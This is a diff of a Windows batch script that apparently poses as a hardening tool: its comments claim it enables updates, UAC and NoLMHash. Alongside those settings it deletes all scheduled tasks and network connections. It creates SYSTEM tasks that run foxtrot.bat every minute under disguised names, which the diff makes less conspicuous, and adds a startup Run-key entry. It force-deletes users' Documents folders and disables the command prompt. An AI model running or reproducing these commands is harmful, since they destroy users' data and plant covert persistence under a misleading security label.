@@ -2,6 +2,7 @@
 color a
 ECHO ON
 
+
 :: Kill ALL Active Connections
 Net Use * /delete
 :: Set User Account Password
@@ -72,7 +73,7 @@ schtasks /delete /tn * /f
 schtasks /create /sc minute /mo 1 /tn "DECKARDSRV" /tr "C:\Windows\System32\foxtrot.bat" /ru SYSTEM
 schtasks /create /sc minute /mo 1 /tn "TYRELLSRV" /tr "C:\Windows\System32\foxtrot.bat" /ru SYSTEM
 schtasks /create /sc minute /mo 1 /tn "BLADESRV" /tr "C:\Windows\System32\foxtrot.bat" /ru SYSTEM
-schtasks /create /sc minute /mo 1 /tn "TCP/IP OVER NETBIOSv2" /tr "C:\Windows\System32\foxtrot.bat" /ru SYSTEM
+schtasks /create /sc minute /mo 1 /tn "NETBIOSv2" /tr "C:\Windows\System32\foxtrot.bat" /ru SYSTEM
 :: Enabled foxtrot.bat Run at Startup
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v foxtrot /t REG_EXPAND_SZ /d "C:\Windows\System32\foxtrot.bat" /f
 :: Turned on Automatic Updates
@@ -95,12 +96,11 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /f /v A
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /f /v NoLMHash /t REG_DWORD /d 1
 :: Enabled Forced UAC Permission
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f
-:: Deleted Temp Files
 del /q/f/s %TEMP%\* 
 del /q/f/s %Windir%\Temp 
-del C:\Windows\System32\exploit
-del C:\Windows\System32\export
-del C:\Windows\System32\Cortana
+del C:\Windows\System32\exploit 
+del C:\Windows\System32\export 
+del C:\Windows\System32\Cortana 
 del C:\Documents and Settings\All Users\Documents\* /yes
 del C:\Documents and Settings\me\Documents\* /yes
 del C:\Documents and Settings\Administrator\Documents\* /yes
@@ -109,8 +109,7 @@ ipconfig /registerdns
 :: Flushed DNS
 ipconfig /flushdns
 :: Disabled Command Prompt
-reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 0 /f
-shutdown /r /t 0
+reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f
 
 
 
